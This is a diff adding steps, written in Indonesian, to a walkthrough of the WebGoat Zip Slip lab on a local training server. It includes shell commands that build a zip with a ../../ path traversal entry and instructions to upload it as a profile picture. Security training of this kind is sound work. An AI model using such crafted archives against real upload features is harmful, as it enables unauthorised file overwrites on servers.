@@ -111,3 +111,39 @@ echo -n 'usernameanda' | sha512sum
 ![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/path%20traversal/path%20traversal%2026.JPG)
 
 ![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/path%20traversal/path%20traversal%2027.JPG)
+
+## Zip Slip assignment
+- Jalankan satu per satu perintah yang tertera di halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/PathTraversal.lesson/7
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/path%20traversal/path%20traversal%2028.JPG)
+
+- Anda juga bisa meng-copy tiap baris perintah dibawah ini
+```sh
+mkdir -p /home/kali/.webgoat-2023.4/PathTraversal/testing
+cd /home/kali/.webgoat-2023.4/PathTraversal/testing
+curl -o testing.jpg http://127.0.0.1:9090/images/wolf.png
+zip profile.zip ../../../../../../../../home/kali/.webgoat-2023.4/PathTraversal/testing/testing.jpg
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/path%20traversal/path%20traversal%2029.JPG)
+
+- Copy file **profil.zip** ke direktori lain
+```sh
+cp profile.zip direktori_tujuan
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/path%20traversal/path%20traversal%2030.JPG)
+
+- Buka halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/PathTraversal.lesson/6 dan klik foto profil
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/path%20traversal/path%20traversal%2031.JPG)
+
+- Upload file **profil.zip**
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/path%20traversal/path%20traversal%2032.JPG)
+
+- Tekan tombol **Update**
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/path%20traversal/path%20traversal%2033.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/path%20traversal/path%20traversal%2034.JPG)
